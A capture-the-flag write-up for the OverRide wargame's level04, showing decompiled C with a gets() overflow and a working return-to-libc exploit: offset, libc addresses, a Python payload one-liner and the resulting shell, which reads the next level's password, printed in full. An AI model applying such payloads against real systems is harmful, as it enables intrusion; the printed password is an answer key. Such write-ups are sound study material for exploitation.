```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int stat_loc; // [esp+1Ch] [ebp-9Ch] BYREF
  char s[128]; // [esp+20h] [ebp-98h] BYREF
  int v6; // [esp+A0h] [ebp-18h]
  int v7; // [esp+A4h] [ebp-14h]
  int v8; // [esp+A8h] [ebp-10h]
  __pid_t v9; // [esp+ACh] [ebp-Ch]

  v9 = fork();
  memset(s, 0, sizeof(s));
  v8 = 0;
  stat_loc = 0;
  if ( v9 )
  {
    do
    {
      wait(&stat_loc);
      v6 = stat_loc;
      if ( (stat_loc & 0x7F) == 0 || (v7 = stat_loc, (char)((stat_loc & 0x7F) + 1) >> 1 > 0) )
      {
        puts("child is exiting...");
        return 0;
      }
      v8 = ptrace(PTRACE_PEEKUSER, v9, 44, 0);
    }
    while ( v8 != 11 );
    puts("no exec() for you");
    kill(v9, 9);
  }
  else
  {
    prctl(1, 1);
    ptrace(PTRACE_TRACEME, 0, 0, 0);
    puts("Give me some shellcode, k");
    gets(s);
  }
  return 0;
}
```

Looking at the source code, it looks like we can overflow the buffer `s` and overwrite the return address. However this overflow happens on the child process so we will have to find the return offset on the child process. To do this we use run `set follow-fork-mode child` so gdb will follow child instead of main process and then use pattern generator to see where it crashes. And the offset is at `156`.

We will be doing return2libc. We need the address of `system`, `/bin/sh` and `exit`. Which is same address as in level01 because we're linking to same libc. With these we should be able to build the payload as follow and execute.

payload: [filling the buffer] + [system] + [exit] + [/bin/sh]

system: 0xf7e6aed0

exit: 0xf7e5eb70

/bin/sh: 0xf7f897ec

```shell
level04@OverRide:~$ python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' > /tmp/payload
level04@OverRide:~$ cat /tmp/payload - | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```